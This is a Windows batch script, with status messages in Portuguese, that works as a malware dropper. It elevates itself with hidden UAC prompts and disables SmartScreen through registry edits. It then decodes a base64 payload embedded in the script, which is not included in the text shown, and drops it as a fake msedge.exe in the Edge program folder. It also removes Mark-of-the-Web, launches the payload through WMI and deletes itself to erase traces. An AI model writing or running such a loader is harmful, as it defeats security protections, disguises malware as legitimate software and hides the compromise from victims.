@echo off
setlocal EnableDelayedExpansion

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -NoP -W Hidden -Command "Start-Process cmd -ArgumentList '/c \"\"%~f0\"\" --go' -Verb RunAs -WindowStyle Hidden"
    exit /b
)

if "%~1"=="" (
    echo [*] Executando sem elevação. Elevando...
    powershell -NoP -W Hidden -Command "Start-Process cmd -ArgumentList '/c \"\"%~f0\"\" --go' -Verb RunAs -WindowStyle Hidden"
    exit /b
)

:main
echo [*] Desativando SmartScreen...
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d "Off" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f >nul 2>&1

set "D=C:\Program Files\Microsoft\MicrosoftEdge"
set "P=%D%\msedge.exe"
set "T=%TEMP%\%RANDOM%.b64"

if not exist "%D%" mkdir "%D%" >nul 2>&1
echo [*] Extraindo payload...
powershell -NoP -W Hidden -Command "$f=[IO.File]::ReadAllText('%~f0');$s=$f.IndexOf('--B64--')+7;$e=$f.IndexOf('--END--');$b=$f.Substring($s,$e-$s);[IO.File]::WriteAllBytes('%P%',[Convert]::FromBase64String($b))"

if not exist "%P%" (
    echo [!] Falha ao extrair payload.
    pause & exit /b
)

echo [*] Removendo Mark-of-the-Web...
powershell -NoP -W Hidden -Command "Unblock-File -Path '%P%'"

echo [*] Executando payload...
powershell -NoP -W Hidden -Command "$p=[WmiClass]'Win32_Process';$p.Create('%P% -fullinstall','%D%',$null)|Out-Null"

echo [*] Limpando rastros...
timeout /t 5 >nul
del /f /q "%~f0" >nul 2>&1
exit /b
